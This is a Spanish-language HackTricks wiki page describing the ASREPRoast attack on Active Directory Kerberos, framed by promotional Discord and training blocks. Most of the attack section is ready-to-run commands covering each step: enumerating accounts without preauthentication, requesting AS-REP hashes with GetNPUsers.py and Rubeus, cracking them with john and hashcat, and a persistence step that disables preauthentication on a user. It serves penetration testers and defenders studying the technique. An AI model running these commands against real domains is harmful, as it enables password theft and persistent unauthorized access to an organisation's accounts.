# ASREPRoast

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Involúcrate con contenido que profundiza en la emoción y desafíos del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al día con el mundo del hacking a través de noticias e información en tiempo real

**Últimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores y actualizaciones importantes de plataformas

**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota a usuarios que carecen del **atributo requerido de preautenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC luego responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar sin conexión para descubrir la contraseña del usuario.

Los principales requisitos para este ataque son:
- **Falta de preautenticación de Kerberos**: Los usuarios objetivo no deben tener esta característica de seguridad habilitada.
- **Conexión al Controlador de Dominio (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar nombres de usuario.


#### Enumerando usuarios vulnerables (necesita credenciales de dominio)

{% code title="Usando Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Usando Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
{% endhint %}

### Descifrado
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencia

Forzar **preauth** no requerido para un usuario en el que tengas permisos de **GenericAll** (o permisos para escribir propiedades):

{% code title="Usando Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Referencias

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Participa en contenido que explora la emoción y los desafíos del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al día con el mundo del hacking a través de noticias e información en tiempo real

**Últimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones cruciales de las plataformas

**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ¡y comienza a colaborar con los mejores hackers hoy!

<details>

<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
